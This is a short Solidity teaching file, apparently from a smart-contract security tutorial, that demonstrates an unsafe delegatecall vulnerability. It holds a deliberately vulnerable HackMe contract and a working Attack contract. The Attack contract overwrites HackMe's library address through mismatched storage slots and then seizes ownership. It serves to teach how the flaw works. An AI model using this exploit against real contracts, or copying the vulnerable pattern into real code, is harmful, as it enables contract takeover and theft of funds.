// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

/*
Unsafe delegatecall

What is delegatecall?
A -> B
run your code inside my context (storage, msg.sender, msg.value, msg.data, etc...)
1. delegatecall preserves context
2. storage layout must be the same for A and B

Vulnerability
2 Examples (part 1 and part 2)
Example 1 - Code and demo
*/

contract Lib {
    uint public someNumber;

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract HackMe {
    address public lib; // slot 0
    address public owner; // slot 1
    uint public someNumber; // slot 2

    constructor(address _lib) public {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
    address public lib; // slot 0
    address public owner; // slot 1
    uint public someNumber; // slot 2

    HackMe public hackMe; // slot 3

    constructor(HackMe _hackMe) public {
        hackMe = HackMe(_hackMe);
    }

    function attack() public {
        hackMe.doSomething(uint(address(this)));
        hackMe.doSomething(1);
    }

    function doSomething(uint _num) public {
        // Attack -> HackMe --- delegatecall ----> Attack
        //           msg.sender = Attack.          msg.sender = Attack
        owner = msg.sender;
    }
}
